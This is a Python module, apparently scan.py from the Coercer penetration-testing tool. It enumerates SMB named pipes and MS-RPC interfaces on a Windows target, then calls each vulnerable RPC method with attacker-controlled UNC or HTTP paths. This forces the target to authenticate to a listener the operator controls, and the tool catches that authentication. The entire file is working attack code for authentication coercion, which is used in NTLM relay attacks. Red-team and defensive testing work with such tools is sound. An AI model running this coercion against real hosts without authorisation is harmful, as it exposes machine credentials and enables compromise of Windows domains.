#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : scan.py
# Author             : Podalirius (@podalirius_)
# Date created       : 18 Sep 2022


import time
from colorama import Fore
from coercer.core.utils import generate_exploit_path_from_template, generate_tasks, generate_filter
from coercer.network.DCERPCSession import DCERPCSession
from coercer.structures.TestResult import TestResult
from coercer.network.authentications import trigger_and_catch_authentication
from coercer.network.smb import can_connect_to_pipe, can_bind_to_interface
from coercer.network.utils import get_ip_addr_to_listen_on, get_next_http_listener_port


def action_scan(target, available_methods, options, credentials, reporter):
    http_listen_port = 0

    # Fetch tasks based on filters and available methods
    _filter = generate_filter(options.filter_protocol_name, options.filter_pipe_name, available_methods)
    tasks = generate_tasks(_filter, options.filter_method_name)

    listening_ip = get_ip_addr_to_listen_on(target, options)

    if options.verbose:
        print(f"[+] Coercing '{target}' to authenticate to '{listening_ip}'")

    # Processing ncan_np tasks
    if tasks is None:
        return None

    ncan_np_tasks = tasks["ncan_np"]
    for namedpipe in sorted(ncan_np_tasks.keys()):
        if can_connect_to_pipe(target, namedpipe, credentials):
            if options.verbose:
                print(f"[+] SMB named pipe {Fore.GREEN + namedpipe + Fore.RESET} is accessible")
            for uuid in sorted(ncan_np_tasks[namedpipe].keys()):
                for version in sorted(ncan_np_tasks[namedpipe][uuid].keys()):
                    if can_bind_to_interface(target, namedpipe, credentials, uuid, version):
                        print("   [+] Successful bind to interface (%s, %s)!" % (uuid, version))
                        for msprotocol_class in sorted(ncan_np_tasks[namedpipe][uuid][version],
                                                       key=lambda x: x.function["name"]):

                            exploit_paths = msprotocol_class.generate_exploit_templates(desired_auth_type=options.auth_type)

                            stop_exploiting_this_function = False
                            for listener_type, exploit_path in exploit_paths:
                                if stop_exploiting_this_function:
                                    # Got a nca_s_unk_if response, this function does not listen on the given interface
                                    continue

                                if listener_type == "http":
                                    http_listen_port = get_next_http_listener_port(current_value=http_listen_port,
                                                                                   listen_ip=listening_ip,
                                                                                   options=options)

                                exploit_path = generate_exploit_path_from_template(
                                    template=exploit_path,
                                    listener=listening_ip,
                                    http_listen_port=options.http_port,
                                    smb_listen_port=options.smb_port
                                )

                                msprotocol_rpc_instance = msprotocol_class(path=exploit_path)
                                dcerpc = DCERPCSession(credentials=credentials, verbose=True)
                                dcerpc.connect_ncacn_np(target=target, pipe=namedpipe)

                                if dcerpc.session is not None:
                                    dcerpc.bind(interface_uuid=uuid, interface_version=version)
                                    if dcerpc.session is not None:
                                        reporter.print_testing(msprotocol_rpc_instance)

                                        result = trigger_and_catch_authentication(
                                            options=options,
                                            dcerpc_session=dcerpc.session,
                                            target=target,
                                            listener_type=listener_type,
                                            method_trigger_function=msprotocol_rpc_instance.trigger,
                                            listen_ip=listening_ip,
                                            http_port=http_listen_port
                                        )

                                        reporter.report_test_result(
                                            target=target, uuid=uuid, version=version, namedpipe=namedpipe,
                                            msprotocol_rpc_instance=msprotocol_rpc_instance,
                                            result=result,
                                            exploitpath=exploit_path
                                        )

                                        if result == TestResult.NCA_S_UNK_IF:
                                            stop_exploiting_this_function = True

                                if options.delay is not None:
                                    # Sleep between attempts
                                    time.sleep(options.delay)
                    else:
                        if options.verbose:
                            print(f" {Fore.RED}>{Fore.RESET} Failed binding to interface ({uuid}, {version})!")
        else:
            if options.verbose:
                print(f"[!] SMB named pipe {Fore.RED + namedpipe + Fore.RESET} not accessible!")

